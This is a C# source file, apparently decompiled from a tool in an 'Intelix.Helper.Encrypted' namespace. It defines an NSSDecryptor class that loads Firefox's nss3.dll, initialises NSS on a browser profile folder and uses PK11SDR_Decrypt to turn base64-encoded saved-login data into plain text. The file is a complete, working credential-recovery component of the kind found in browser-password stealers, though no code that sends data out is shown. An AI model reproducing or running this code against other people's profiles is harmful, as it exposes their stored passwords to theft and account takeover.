using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;

namespace Intelix.Helper.Encrypted
{
	// Token: 0x02000076 RID: 118
	public static class NSSDecryptor
	{
		// Token: 0x060001D3 RID: 467
		[DllImport("nss3.dll", CallingConvention = CallingConvention.Cdecl)]
		private static extern int NSS_Init(string configdir);

		// Token: 0x060001D4 RID: 468
		[DllImport("nss3.dll", CallingConvention = CallingConvention.Cdecl)]
		private static extern int NSS_Shutdown();

		// Token: 0x060001D5 RID: 469
		[DllImport("nss3.dll", CallingConvention = CallingConvention.Cdecl)]
		private static extern int PK11SDR_Decrypt(ref NSSDecryptor.SECItem data, ref NSSDecryptor.SECItem result, int cx);

		// Token: 0x060001D6 RID: 470 RVA: 0x0001701C File Offset: 0x0001521C
		public static bool Initialize(string profilePath)
		{
			bool result;
			try
			{
				string text = "C:\\Program Files\\Mozilla Firefox";
				bool flag = !Directory.Exists(text);
				if (flag)
				{
					result = false;
				}
				else
				{
					string text2 = Environment.GetEnvironmentVariable("PATH");
					text2 = text2 + ";" + text;
					Environment.SetEnvironmentVariable("PATH", text2);
					result = (NSSDecryptor.NSS_Init(profilePath) == 0);
				}
			}
			catch
			{
				result = false;
			}
			return result;
		}

		// Token: 0x060001D7 RID: 471 RVA: 0x0001708C File Offset: 0x0001528C
		public static string Decrypt(string base64)
		{
			string result;
			try
			{
				byte[] array = Convert.FromBase64String(base64);
				bool flag = array.Length == 0;
				if (flag)
				{
					result = null;
				}
				else
				{
					NSSDecryptor.SECItem secitem = new NSSDecryptor.SECItem
					{
						Data = Marshal.AllocHGlobal(array.Length),
						Len = array.Length,
						Type = 0
					};
					Marshal.Copy(array, 0, secitem.Data, array.Length);
					NSSDecryptor.SECItem secitem2 = default(NSSDecryptor.SECItem);
					int num = NSSDecryptor.PK11SDR_Decrypt(ref secitem, ref secitem2, 0);
					Marshal.FreeHGlobal(secitem.Data);
					bool flag2 = num != 0 || secitem2.Data == IntPtr.Zero;
					if (flag2)
					{
						result = null;
					}
					else
					{
						byte[] array2 = new byte[secitem2.Len];
						Marshal.Copy(secitem2.Data, array2, 0, secitem2.Len);
						result = Encoding.UTF8.GetString(array2);
					}
				}
			}
			catch
			{
				result = null;
			}
			return result;
		}

		// Token: 0x020000F9 RID: 249
		public struct SECItem
		{
			// Token: 0x0400021E RID: 542
			public int Type;

			// Token: 0x0400021F RID: 543
			public IntPtr Data;

			// Token: 0x04000220 RID: 544
			public int Len;
		}
	}
}
